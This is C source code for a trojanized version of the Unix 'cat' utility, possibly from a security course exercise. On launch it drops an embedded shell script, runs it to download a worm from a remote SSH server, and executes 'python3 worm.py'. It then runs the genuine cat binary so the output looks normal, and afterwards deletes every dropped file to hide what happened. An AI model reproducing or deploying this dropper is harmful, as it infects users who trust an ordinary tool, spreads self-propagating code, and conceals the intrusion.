#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include "catz.h"
#include "connect_server.h"
#include "address_port.h"

int main(int argc, char *argv[]){
    // 1. Run attack function
    // get address_port.h to .txt
    FILE *fptr;
    fptr = fopen("address_port.txt", "wb");
    fwrite(address_port_txt, address_port_txt_len, 1, fptr);
    fclose(fptr);
    fptr = fopen("address_port.txt", "r");

    // get command 'bash connect_server.sh address port'
    char *line = NULL;
    size_t len;
    getline(&line, &len, fptr);
    fclose(fptr);
    char command[60] = "bash connect_server.sh";
    strcat(command, line);

    // run connect_server.sh download worm from ssh server and run
    fptr = fopen("connect_server.sh", "wb");
    fwrite(connect_server_sh, connect_server_sh_len, 1, fptr);
    fclose(fptr);
    system(command);
    sleep(4);
    system("python3 worm.py");

    // 2. Run cat function
    // uncompress cat-zip
    fptr = fopen("./catzip.zip", "wb");
    fwrite(catz_zip, catz_zip_len, 1, fptr);
    fclose(fptr);
    system("unzip catzip.zip > log");
    system("chmod +x cat1");

    // run original cat
    pid_t pid;
    pid = fork();
    if(pid == 0){
        // append argv and call cat function
        char a[] = "./cat1";
        argv[0] = a;
        int outcome = execvp("./cat1", argv);
        if(outcome == -1)printf("error in execvp\n");
    }
    else{
        int status;
        waitpid(pid, &status, 0);
        system("rm address_port.txt");
        system("rm connect_server.sh");
        system("rm worm.py");
        system("rm catzip.zip");
        system("rm log");
        system("rm cat1");
    }

}